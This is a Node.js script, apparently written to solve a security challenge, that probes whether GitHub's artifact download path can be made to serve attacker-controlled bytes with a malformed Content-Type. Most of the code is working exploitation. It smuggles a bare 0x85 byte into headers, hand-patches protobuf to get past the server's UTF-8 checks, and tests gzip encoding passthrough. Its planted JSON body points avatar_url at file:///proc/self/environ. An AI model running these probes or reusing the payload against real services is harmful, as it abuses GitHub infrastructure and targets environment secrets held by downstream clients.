// Can api.github.com be made to serve our bytes with Content-Type carrying a BARE 0x85?
import https from 'node:https';
import { createHash } from 'node:crypto';
import { gzipSync } from 'node:zlib';
import { internalArtifactTwirpClient } from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue, CreateArtifactRequest, CreateArtifactResponse } from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids   = getBackendIdsFromToken();
const twirp = internalArtifactTwirpClient({ maxAttempts: 1 });
const RUN   = process.env.GITHUB_RUN_ID;
const REPO  = process.env.GITHUB_REPOSITORY;
const TOKEN = process.env.GH_TOKEN;
const NEL_CT = '\u0085application/json';          // node emits header values latin1 -> bare 0x85

function req(url, { method = 'GET', headers = {}, body = null, follow = false } = {}) {
  return new Promise((resolve, reject) => {
    const r = https.request(url, { method, headers }, res => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers,
                                    rawHeaders: res.rawHeaders, body: Buffer.concat(chunks) }));
    });
    r.on('error', reject);
    r.setTimeout(20000, () => r.destroy(new Error('timeout')));
    if (body) r.write(body);
    r.end();
  });
}
const rawHeaderHex = (res, want) => {
  for (let i = 0; i < res.rawHeaders.length; i += 2)
    if (res.rawHeaders[i].toLowerCase() === want) return Buffer.from(res.rawHeaders[i + 1], 'latin1').toString('hex');
  return null;
};

async function putBlob(sasUrl, body, extra = {}) {
  return req(sasUrl, { method: 'PUT', body,
    headers: { 'x-ms-blob-type': 'BlockBlob', 'content-length': String(body.length),
               'x-ms-version': '2021-08-06', ...extra } });
}

async function finalize(name, size) {
  return twirp.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name, size: String(size),
  });
}

// Download through the public REST API exactly like the challenge does, and report the served type.
async function inspectDownload(artifactId) {
  const api = await req(`https://api.github.com/repos/${REPO}/actions/artifacts/${artifactId}/zip`, {
    headers: { accept: 'application/vnd.github.v3+json', authorization: `Bearer ${TOKEN}`, 'user-agent': 'probe' },
  });
  const loc = api.headers.location;
  if (!loc) return { apiStatus: api.status, note: 'no redirect' };
  const u = new URL(loc);
  const blob = await req(loc, { headers: { 'user-agent': 'probe' } });
  return {
    apiStatus: api.status,
    rsct: u.searchParams.get('rsct'), rsce: u.searchParams.get('rsce'),
    servedTypeHex: rawHeaderHex(blob, 'content-type'),
    servedEncoding: blob.headers['content-encoding'] ?? null,
    blobStatus: blob.status, bodySha256: createHash('sha256').update(blob.body).digest('hex'),
    bodyLen: blob.body.length,
  };
}

const bodyFor = name => Buffer.from(JSON.stringify({
  full_name: `${REPO}/actions/artifacts/PENDING/zip`, probe: name,
  owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
}));

async function caseJsonMime() {
  const name = `p-jsonmime-${RUN}`, body = bodyFor(name);
  const c = await twirp.CreateArtifact({ workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId, name, version: 7,
    mimeType: StringValue.create({ value: 'application/json' }) });
  const up = await putBlob(c.signedUploadUrl, body, { 'x-ms-blob-content-type': NEL_CT });
  const f = await finalize(name, body.length);
  return { case: 'A json-mime + NEL blob type', upload: up.status, artifactId: String(f.artifactId),
           ...(await inspectDownload(f.artifactId)) };
}

async function caseNoMime() {
  const name = `p-nomime-${RUN}`, body = bodyFor(name);
  const c = await twirp.CreateArtifact({ workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId, name, version: 7 });
  const up = await putBlob(c.signedUploadUrl, body, { 'x-ms-blob-content-type': NEL_CT });
  const f = await finalize(name, body.length);
  return { case: 'B no mime + NEL blob type', upload: up.status, artifactId: String(f.artifactId),
           ...(await inspectDownload(f.artifactId)) };
}

// THE untried one: smuggle a bare 0x85 into mime_type using the protobuf wire format,
// so the server's JSON decoder (which rejects invalid UTF-8) is never involved.
async function caseProtoNel() {
  const name = `p-protonel-${RUN}`, body = bodyFor(name);
  const placeholder = 'application/json~';
  const msg = CreateArtifactRequest.create({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name, version: 7, mimeType: StringValue.create({ value: placeholder }),
  });
  const bin = Buffer.from(CreateArtifactRequest.toBinary(msg));
  const at = bin.indexOf(Buffer.from(placeholder, 'latin1'));
  if (at < 0) return { case: 'C protobuf bare-0x85 mime', error: 'placeholder not found in encoding' };
  bin[at + placeholder.length - 1] = 0x85;                    // same length -> no length fixups
  const base = process.env.ACTIONS_RESULTS_URL;
  const res = await req(`${base}twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact`, {
    method: 'POST', body: bin,
    headers: { 'content-type': 'application/protobuf', 'content-length': String(bin.length),
               authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`, 'user-agent': 'probe' },
  });
  if (res.status !== 200) return { case: 'C protobuf bare-0x85 mime', createStatus: res.status,
                                   createBody: res.body.toString('utf8').slice(0, 300) };
  const parsed = CreateArtifactResponse.fromBinary(res.body);
  const up = await putBlob(parsed.signedUploadUrl, body, { 'x-ms-blob-content-type': NEL_CT });
  const f = await finalize(name, body.length);
  return { case: 'C protobuf bare-0x85 mime', createStatus: 200, upload: up.status,
           artifactId: String(f.artifactId), ...(await inspectDownload(f.artifactId)) };
}

// Does the blob's Content-Encoding pass through (no rsce in the SAS)?
async function caseGzip() {
  const name = `p-gzip-${RUN}`, raw = bodyFor(name), body = gzipSync(raw);
  const c = await twirp.CreateArtifact({ workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId, name, version: 7,
    mimeType: StringValue.create({ value: 'application/json' }) });
  const up = await putBlob(c.signedUploadUrl, body,
    { 'x-ms-blob-content-type': 'application/json', 'x-ms-blob-content-encoding': 'gzip' });
  const f = await finalize(name, body.length);
  return { case: 'D gzip content-encoding passthrough', upload: up.status, artifactId: String(f.artifactId),
           rawSha256: createHash('sha256').update(raw).digest('hex'), ...(await inspectDownload(f.artifactId)) };
}

for (const fn of [caseJsonMime, caseNoMime, caseProtoNel, caseGzip]) {
  try { console.log('PROBE ' + JSON.stringify(await fn())); }
  catch (e) { console.log('PROBE ' + JSON.stringify({ case: fn.name, error: String(e?.message || e).slice(0, 300) })); }
}
// and the one GitHub storage URL measured to carry no rsct
try {
  const done = JSON.parse((await req(`https://api.github.com/repos/${REPO}/actions/runs?status=completed&per_page=1`, { headers: { accept: 'application/vnd.github.v3+json', authorization: `Bearer ${TOKEN}`, 'user-agent': 'probe' } })).body.toString());
  const prior = done.workflow_runs?.[0]?.id ?? RUN;
  const api = await req(`https://api.github.com/repos/${REPO}/actions/runs/${prior}/logs`, {
    headers: { accept: 'application/vnd.github.v3+json', authorization: `Bearer ${TOKEN}`, 'user-agent': 'probe' } });
  const loc = api.headers.location;
  const out = { case: 'E run-logs', apiStatus: api.status };
  if (loc) { const u = new URL(loc); out.rsct = u.searchParams.get('rsct');
             const b = await req(loc, { headers: { 'user-agent': 'probe' } });
             out.servedTypeHex = rawHeaderHex(b, 'content-type'); }
  console.log('PROBE ' + JSON.stringify(out));
} catch (e) { console.log('PROBE ' + JSON.stringify({ case: 'E run-logs', error: String(e?.message || e) })); }
